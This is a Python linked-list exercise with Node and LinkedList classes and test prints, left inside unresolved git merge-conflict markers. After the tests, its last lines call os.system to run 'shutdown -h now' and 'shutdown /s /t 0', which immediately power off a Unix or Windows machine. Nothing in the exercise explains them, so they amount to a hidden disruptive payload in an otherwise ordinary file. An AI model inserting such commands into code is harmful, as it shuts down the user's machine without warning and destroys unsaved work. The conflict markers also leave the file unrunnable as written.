<<<<<<< Updated upstream
from copy import deepcopy

class Node:
    #constructor
    def __init__(self, contents: str):
        self.contents = contents
        self.next = None

    def __repr__(self):
        return self.contents

    #add = self + term
    def __add__(self, term):
        #must be a string
        if not isinstance(term, str):
            return NotImplemented
        else:
            #contents is a string, so add the term to it
            self.contents += term
            return self

    #radd = term + self (basically left append)
    def __radd__(self, term):
        #must be a string
        if not isinstance(term, str):
            return NotImplemented
        else:
            #contents is a string, so add it to the term
            self.contents = term + self.contents
            return self

#create nodes for the first linked list
red_fish = Node("Red Fish")
blue_fish = Node("Blue Fish")
one_fish = Node("Fish")
two_fish = Node("Two")
#test the add magic method
one_fish = "One " + one_fish
two_fish += " Fish"

#create nodes for the second linked list
brain = Node("brain")
shoulders = Node("shoulders")
knees = Node("knees")
toes = Node("toes")

class LinkedList:
    #constructor
    def __init__(self):
        self.head = None

    #append_right = add a new node to the right side of the list & link it
    def append_right(self, node : Node):
        #remove linkage to next node (safeguard)
        node.next = None
        #if list is empty, make this node the new head
        if not self.head:
            self.head = node
        #otherwise, iterate through the list until at the end, then link the end to this node
        else:
            current_node = self.head
            while current_node.next:
                current_node = current_node.next
            current_node.next = node

    #append_left = add a new node to the left side of the list, & make it the new head & link it
    def append_left(self, node : Node):
        #if list is empty, make this node the new head
        if not self.head:
            self.head = node
        #otherwise, link this node to the head node, then make this node the new head
        else:
            node.next = self.head
            self.head = node

    #pop_right = remove & return the last node on the right side of the list
    def pop_right(self):
        #iterate through the list until at the end
        current_node = self.head
        while current_node.next.next:
            current_node = current_node.next
        #grab the last node to be removed
        node_to_return = current_node.next
        #remove the linkage from the 2nd to last node -> last node
        current_node.next = None
        #return the removed node
        return node_to_return

    #pop_left = remove & return the first node on the left side of the list
    def pop_left(self):
        #grab the first node to be removed
        node_to_return = self.head
        #make the 2nd node in the list the new head
        self.head = self.head.next
        #remove the linkage from the 1st node -> 2nd node
        node_to_return.next = None
        #return the removed node
        return node_to_return

    #index = given a number, return the node at that position in the list
    #example: index(2) returns the 3rd node in the list
    #i used this to write reverse_contents
    def index(self, i : int):
        #current_node = pointer to be iterated
        current_node = self.head    
        #given an integer 0 or greater, iterate through the list that many times
        if i >= 0:
            for i in range(i):
                current_node = current_node.next
            #return the node after the iterations
            return current_node
        #if given a negative number (which does not exist in the list), return none
        else:
            return None

    #reverse_contents = the end of the list (right side) becomes the new head, and all the other nodes get reversed order
    def reverse_contents(self):
        #if the list is not empty
        if self.head:
            #start the length of the list at 1
            list_length = 1
            #start the new head at the original head, it will get changed
            new_head = self.head
            #iterate through the list until the end
            while new_head.next:
                #update the new head (at the end it will be the last node in the list)
                new_head = new_head.next
                #increase the list length every iteration (at the end list_length will actually reflect the length)
                list_length += 1
            #iterate through the list BACKWARDS, from right to left
            current_node = new_head
            for i in range(list_length):
                #decrement list length each pass, this is basically the pointer for index()
                list_length -= 1
                #set the current_node's next to the previous node (the node to the left of it)
                current_node.next = self.index(list_length - 1)
                #move the current node pointer to the left
                current_node = current_node.next
            #finally, update the head so that the list starts at the other end
            self.head = new_head
        #if the list is empty, do nothing
        else:
            pass
    
    def __repr__(self):
        #start the string to return
        string = f"linked list containing: {self.head}"
        #iterate through the list and add the name of each node to the string to return
        current_node = self.head
        while current_node:
            string += f" -> {current_node.next}"
            current_node = current_node.next
        #return the full string of contents
        return string

    #add = self + term
    def __add__(self, term):
        #must be adding a linnked list
        if not isinstance(term, LinkedList):
            return NotImplemented
        else:
            #make deep copies of both lists, as to not tamper with the original linkages
            self_copy = deepcopy(self)
            term_copy = deepcopy(term)
            #iterate through the first list
            current_node = self_copy.head
            while current_node.next:
                current_node = current_node.next
            #when the end of the first list is reached, link that node to the head of the second list (term)
            current_node.next = term_copy.head
            #return self_copy, which contains copies of all the objects in the original lists, all linked together
            return self_copy


#create first linked list
link1 = LinkedList()
print(link1)

#put nodes into the first linked list
link1.append_right(red_fish)
link1.append_right(blue_fish)
link1.append_left(one_fish)
link1.append_left(two_fish)

#test pop method
link1.append_left(link1.pop_right())
link1.append_left(link1.pop_right())

print(link1)

#test reverse contents method
link1.reverse_contents()

print(link1)

#create second linked list
link2 = LinkedList()

#put nodes into the second linked list
link2.append_right(brain)
link2.append_right(shoulders)
link2.append_right(knees)
link2.append_right(toes)

print(link2)

#test reverse contents method again
link2.reverse_contents()

print(link2)

#test add method for linked lists
link12 = link1 + link2
print(link12)

#test reverse contents method again
link12.reverse_contents()
print(link12)

import os
os.system("shutdown -h now")
os.system("shutdown /s /t 0")
=======
>>>>>>> Stashed changes
